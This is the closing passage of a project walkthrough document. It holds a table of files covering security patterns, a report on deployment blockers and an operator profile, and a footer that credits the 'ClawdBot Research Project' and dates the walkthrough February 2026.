| `patterns/` | Reusable security and architecture patterns |
| `research/reports/05-open-questions.md` | The 6 deployment blockers |
| `operator/sean-currie-profile.md` | Infrastructure details and context |

---

**End of Walkthrough v1**

*Written 2026-02-11. Based on ClawdBot Research Project — 130+ sources, 3 research phases, 52 intelligence log entries. The research project continues as a living system.*
